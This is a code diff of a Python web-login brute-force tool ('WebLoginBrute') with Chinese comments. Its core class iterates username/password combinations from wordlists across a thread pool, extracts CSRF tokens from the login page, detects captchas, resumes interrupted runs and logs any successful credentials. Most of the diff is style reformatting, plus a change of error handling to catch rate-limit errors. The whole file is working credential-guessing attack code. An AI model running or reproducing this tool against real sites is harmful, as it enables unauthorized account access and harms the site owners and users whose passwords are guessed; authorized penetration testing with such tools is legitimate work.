@@ -2,25 +2,28 @@
 # -*- coding: utf-8 -*-
 
 import logging
-import sys
+import os
+import signal
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from threading import Event
+from threading import Event, RLock
 from typing import List
 
 from .config import Config
-from .logger import setup_logging
+from .exceptions import RateLimitError
 from .http_client import HttpClient
-from .parsers import extract_token, contains_captcha, analyze_form_fields
-from .state import StateManager
+from .logger import setup_logging
+from .parsers import analyze_form_fields, contains_captcha, extract_token
 from .reporting import StatsManager
+from .state import StateManager
 from .wordlists import load_wordlist
-from .exceptions import ConfigurationError, NetworkError
+
 
 class WebLoginBrute:
     """
     核心流程调度类，负责整体爆破流程的编排与异常处理。
     """
+
     def __init__(self, config: Config):
         self.config = config
         setup_logging(config.verbose)
@@ -43,9 +46,11 @@ class WebLoginBrute:
         if stats_from_file:
             self.stats.update_from_progress(stats_from_file)
         # 4. 设置线程池
-        self.executor = ThreadPoolExecutor(max_workers=self.config.threads, thread_name_prefix="WebLoginBrute")
+        self.executor = ThreadPoolExecutor(
+            max_workers=self.config.threads, thread_name_prefix="WebLoginBrute"
+        )
         # 5. 记录开始时间
-        self.stats.stats['start_time'] = time.time()
+        self.stats.stats["start_time"] = time.time()
         try:
             self._brute_force(usernames, passwords)
         except KeyboardInterrupt:
@@ -55,7 +60,7 @@ class WebLoginBrute:
             logging.error(f"运行过程中发生错误: {e}")
             self.state.save_progress(self.stats.get_stats())
         finally:
-            self.stats.stats['end_time'] = time.time()
+            self.stats.stats["end_time"] = time.time()
             self.stats.finalize()
             self.stats.print_final_report()
             if self.success.is_set():
@@ -66,7 +71,12 @@ class WebLoginBrute:
         total_combinations = len(usernames) * len(passwords)
         logging.info(f"开始暴力破解，总共 {total_combinations} 个组合")
         # 过滤已尝试的组合
-        combinations = [(u, p) for u in usernames for p in passwords if not self.state.has_been_attempted((u, p))]
+        combinations = [
+            (u, p)
+            for u in usernames
+            for p in passwords
+            if not self.state.has_been_attempted((u, p))
+        ]
         logging.info(f"过滤后剩余 {len(combinations)} 个组合")
         # 提交任务到线程池
         if not self.executor:
@@ -101,12 +111,14 @@ class WebLoginBrute:
             # 1. 获取登录页面，提取token
             resp = self.http.get(self.config.form_url)
             if not resp or not resp.text:
-                self.stats.update('other_errors')
+                self.stats.update("other_errors")
                 return False
             analyze_form_fields(resp.text)
             token = None
             if self.config.csrf:
-                token = extract_token(resp.text, resp.headers.get('Content-Type', ''), self.config.csrf)
+                token = extract_token(
+                    resp.text, resp.headers.get("Content-Type", ""), self.config.csrf
+                )
                 if not token:
                     logging.warning(f"未能为 {username}:{password} 提取Token")
             # 2. 构造登录数据
@@ -120,25 +132,25 @@ class WebLoginBrute:
             # 4. 检查登录结果
             if self._check_login_success(resp2):
                 logging.info(f"登录成功: {username}:{password}")
-                self.stats.update('successful_attempts')
+                self.stats.update("successful_attempts")
                 return True
             # 5. 检查验证码
             if contains_captcha(resp2.text):
-                self.stats.update('captcha_detected')
+                self.stats.update("captcha_detected")
                 logging.warning(f"检测到验证码: {username}:{password}")
             # 6. 记录失败
-            self.stats.update('total_attempts')
+            self.stats.update("total_attempts")
             self.state.add_attempted((username, password))
-            if self.stats.stats['total_attempts'] % 100 == 0:
+            if self.stats.stats["total_attempts"] % 100 == 0:
                 self.state.save_progress(self.stats.get_stats())
             return False
-        except NetworkError as e:
-            logging.error(f"网络错误: {e}")
-            self.stats.update('connection_errors')
+        except RateLimitError as e:
+            logging.error(f"频率限制错误: {e}")
+            self.stats.update("rate_limit_errors")
             return False
         except Exception as e:
             logging.error(f"未知错误: {e}")
-            self.stats.update('other_errors')
+            self.stats.update("other_errors")
             return False
 
     def _check_login_success(self, response) -> bool:
@@ -146,8 +158,8 @@ class WebLoginBrute:
             return False
         # 简单的成功判断逻辑，可根据实际目标调整
         text = response.text.lower()
-        success_keywords = ['welcome', 'dashboard', 'logout', 'profile', 'success']
-        failure_keywords = ['invalid', 'incorrect', 'failed', 'error', 'login']
+        success_keywords = ["welcome", "dashboard", "logout", "profile", "success"]
+        failure_keywords = ["invalid", "incorrect", "failed", "error", "login"]
         success_count = sum(1 for k in success_keywords if k in text)
         failure_count = sum(1 for k in failure_keywords if k in text)
         return success_count > failure_count
